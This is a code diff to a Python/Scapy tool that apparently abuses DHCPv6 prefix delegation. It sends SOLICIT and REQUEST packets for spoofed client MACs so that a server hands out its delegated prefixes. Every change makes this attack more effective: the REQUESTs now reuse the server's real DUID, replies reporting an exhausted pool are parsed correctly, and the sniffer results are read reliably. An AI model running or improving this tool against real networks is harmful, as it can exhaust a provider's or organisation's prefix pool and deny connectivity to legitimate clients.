@@ -96,8 +96,13 @@ def build_solicit(mac: str, trid: int, iaid: int, plen: int) -> Packet:
     )
 
 
-def build_request(mac: str, trid: int, iaid: int, server_mac: str, prefix: str, plen: int) -> Packet:
-    """REQUEST for the prefix an ADVERTISE offered, addressed to the advertising server."""
+def build_request(mac: str, trid: int, iaid: int, server_mac: str, prefix: str, plen: int,
+                  server_duid: Packet | None = None) -> Packet:
+    """REQUEST for the prefix an ADVERTISE offered, addressed to the advertising server.
+
+    Pass the server DUID from the ADVERTISE as `server_duid`: servers compare the whole DUID,
+    including its time field, so a rebuilt DUID is ignored.
+    """
     mac = normalize_unicast_mac(mac)
     server = normalize_unicast_mac(server_mac)
     return (
@@ -106,7 +111,8 @@ def build_request(mac: str, trid: int, iaid: int, server_mac: str, prefix: str, 
         / UDP(sport=CLIENT_PORT, dport=SERVER_PORT)
         / DHCP6_Request(trid=trid)
         / DHCP6OptClientId(duid=DUID_LLT(lladdr=mac, timeval=0))
-        / DHCP6OptServerId(duid=DUID_LLT(lladdr=server, timeval=0))
+        / DHCP6OptServerId(duid=server_duid.copy() if server_duid is not None
+                           else DUID_LLT(lladdr=server, timeval=0))
         / DHCP6OptIA_PD(iaid=iaid, T1=0, T2=0, iapdopt=[DHCP6OptIAPrefix(plen=plen, prefix=prefix)])
     )
 
@@ -119,6 +125,13 @@ class OfferedPrefix:
     prefix: str
     plen: int
     iaid: int
+    server_duid: Packet | None = None
+
+
+def _first_prefix(ia: Packet) -> Packet | None:
+    """The first IA Prefix option of an IA_PD, or None. A server that has no prefix left answers
+    with a status code instead, and that must not be read as a prefix."""
+    return next((option for option in ia.iapdopt if isinstance(option, DHCP6OptIAPrefix)), None)
 
 
 def parse_advertise(packet: Packet) -> OfferedPrefix | None:
@@ -128,9 +141,9 @@ def parse_advertise(packet: Packet) -> OfferedPrefix | None:
     if not (packet.haslayer(DHCP6OptServerId) and packet.haslayer(DHCP6OptClientId)):
         return None
     ia = packet[DHCP6OptIA_PD]
-    if not ia.iapdopt:
+    offered = _first_prefix(ia)
+    if offered is None:
         return None
-    offered = ia.iapdopt[0]
     return OfferedPrefix(
         trid=packet[DHCP6_Advertise].trid,
         client_mac=packet[DHCP6OptClientId].duid.lladdr,
@@ -138,6 +151,7 @@ def parse_advertise(packet: Packet) -> OfferedPrefix | None:
         prefix=offered.prefix,
         plen=offered.plen,
         iaid=ia.iaid,
+        server_duid=packet[DHCP6OptServerId].duid.copy(),
     )
 
 
@@ -146,9 +160,10 @@ def reply_confirms_prefix(packet: Packet) -> tuple[int, str] | None:
     if not (packet.haslayer(DHCP6_Reply) and packet.haslayer(DHCP6OptIA_PD)):
         return None
     ia = packet[DHCP6OptIA_PD]
-    if not ia.iapdopt:
+    offered = _first_prefix(ia)
+    if offered is None:
         return None
-    return packet[DHCP6_Reply].trid, ia.iapdopt[0].prefix
+    return packet[DHCP6_Reply].trid, offered.prefix
 
 
 def request_prefix_once(
@@ -178,6 +193,8 @@ def request_prefix_once(
     advert_sniffer = wait_for(lambda p: parse_advertise(p) is not None)
     send(build_solicit(mac, trid, iaid, plen), iface=iface, verbose=False)
     advert_sniffer.join(timeout=timeout)
+    # AsyncSniffer publishes its results only when it stops, so stop it before reading them.
+    advert_sniffer.stop()
     advertises = advert_sniffer.results or []
     if not advertises:
         return None
@@ -186,8 +203,10 @@ def request_prefix_once(
         return None
 
     reply_sniffer = wait_for(lambda p: reply_confirms_prefix(p) is not None)
-    send(build_request(mac, trid, iaid, offer.server_mac, offer.prefix, offer.plen), iface=iface, verbose=False)
+    send(build_request(mac, trid, iaid, offer.server_mac, offer.prefix, offer.plen,
+                       server_duid=offer.server_duid), iface=iface, verbose=False)
     reply_sniffer.join(timeout=timeout)
+    reply_sniffer.stop()
     replies = reply_sniffer.results or []
     if not replies:
         return None
@@ -253,7 +272,7 @@ def run_dhcpv6_prefix_delegation_abuse(
             snapshot = replace(stats)
         if config.request:
             send(build_request(offer.client_mac, offer.trid, offer.iaid, offer.server_mac,
-                               offer.prefix, offer.plen),
+                               offer.prefix, offer.plen, server_duid=offer.server_duid),
                  iface=config.iface, verbose=False)
         on_progress(snapshot)
 
